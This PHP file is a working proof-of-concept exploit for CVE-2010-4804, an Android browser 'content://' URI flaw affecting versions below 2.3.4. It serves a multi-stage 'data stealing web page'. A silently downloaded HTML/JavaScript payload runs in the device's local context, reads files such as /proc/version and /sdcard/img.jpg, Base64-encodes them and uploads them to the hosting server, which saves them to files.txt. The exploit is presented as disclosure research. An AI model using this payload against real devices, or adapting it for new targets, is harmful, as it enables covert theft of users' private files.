<?php
/*
* Description:  Android 'content://' URI Multiple Information Disclosure Vulnerabilities
* Bugtraq ID:   48256
* CVE:          CVE-2010-4804
* Affected:     Android < 2.3.4
* Author:       Thomas Cannon
* Discovered:   18-Nov-2010
* Advisory:     http://thomascannon.net/blog/2010/11/android-data-stealing-vulnerability/
*
* Filename:     poc.php
* Instructions: Specify files you want to upload in filenames array. Host this php file
*               on a server and visit it using the Android Browser. Some builds of Android
*               may require adjustments to the script, for example when a German build was
*               tested it downloaded the payload as .htm instead of .html, even though .html
*               was specified.
*
* Tested on:    HTC Desire (UK Version) with Android 2.2
*/

//  List of the files on the device that we want to upload to our server
$filenames = array("/proc/version","/sdcard/img.jpg");

//  Determine the full URL of this script
$protocol = $_SERVER["HTTPS"] == "on" ? "https" : "http";
$scripturl = $protocol."://".$_SERVER["HTTP_HOST"].$_SERVER["SCRIPT_NAME"];

//  Stage 0:  Display introduction text and a link to start the PoC.
function stage0($scripturl) {
  echo "<b>Android < 2.3.4</b><br>Data Stealing Web Page<br><br>Click: <a href=\"$scripturl?stage=1\">Malicious Link</a>";
}

//  Stage 1:  Redirect to Stage 2 which will force a download of the HTML/JS payload, then a few seconds later redirect
//            to the payload. We load the payload using a Content Provider so that the JavaScript is executed in the
//            context of the local device - this is the vulnerability.
function stage1($scripturl) {
  echo "<body onload=\"setTimeout('window.location=\'$scripturl?stage=2\'',1000);setTimeout('window.location=\'content://com.android.htmlfileprovider/sdcard/download/poc.html\'',5000);\">";
}

//  Stage 2:  Download of payload, the Android browser doesn't prompt for the download which is another vulnerability.
//            The payload uses AJAX calls to read file contents and encodes as Base64, then uploads to server (Stage 3).
function stage2($scripturl,$filenames) {
  header("Cache-Control: public");
  header("Content-Description: File Transfer");
  header("Content-Disposition: attachment; filename=poc.html");
  header("Content-Type: text/html");
  header("Content-Transfer-Encoding: binary");
?>
<html>
  <body>
    <script language='javascript'>
      var filenames = Array('<?php echo implode("','",$filenames); ?>');
      var filecontents = new Array();
      function processBinary(xmlhttp) {
        data = xmlhttp.responseText;    r = '';   size = data.length;
        for(var i = 0; i < size; i++)   r += String.fromCharCode(data.charCodeAt(i) & 0xff);
        return r;
      }
      function getFiles(filenames) {
        for (var filename in filenames) {
          filename = filenames[filename];
          xhr = new XMLHttpRequest();
          xhr.open('GET', filename, false);
          xhr.overrideMimeType('text/plain; charset=x-user-defined');
          xhr.onreadystatechange = function() { if (xhr.readyState == 4) { filecontents[filename] = btoa(processBinary(xhr)); } }
          xhr.send();
        }
      }
      function addField(form, name, value) {
        var fe = document.createElement('input');
        fe.setAttribute('type', 'hidden');
        fe.setAttribute('name', name);
        fe.setAttribute('value', value);
        form.appendChild(fe);
      }
      function uploadFiles(filecontents) {
        var form = document.createElement('form');
        form.setAttribute('method', 'POST');
        form.setAttribute('enctype', 'multipart/form-data');
        form.setAttribute('action', '<?=$scripturl?>?stage=3');
        var i = 0;
        for (var filename in filecontents) {
          addField(form, 'filename'+i, btoa(filename));
          addField(form, 'data'+i, filecontents[filename]);
          i += 1;
        }
        document.body.appendChild(form);
        form.submit();
      }
      getFiles(filenames);
      uploadFiles(filecontents);
    </script>
  </body>
</html>
<?php
}

//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.
function stage3() {
  $fp = fopen("files.txt", "w") or die("Couldn't open file for writing!");
  fwrite($fp, print_r($_POST, TRUE)) or die("Couldn't write data to file!");
  fclose($fp);
  echo "Data uploaded to <a href=\"files.txt\">files.txt</a>!";
}

//  Select the stage to run depending on the parameter passed in the URL
switch($_GET["stage"]) {
  case "1":
    stage1($scripturl);
    break;
  case "2":
    stage2($scripturl,$filenames);
    break;
  case "3":
    stage3();
    break;
  default:
    stage0($scripturl);
    break;
}
?>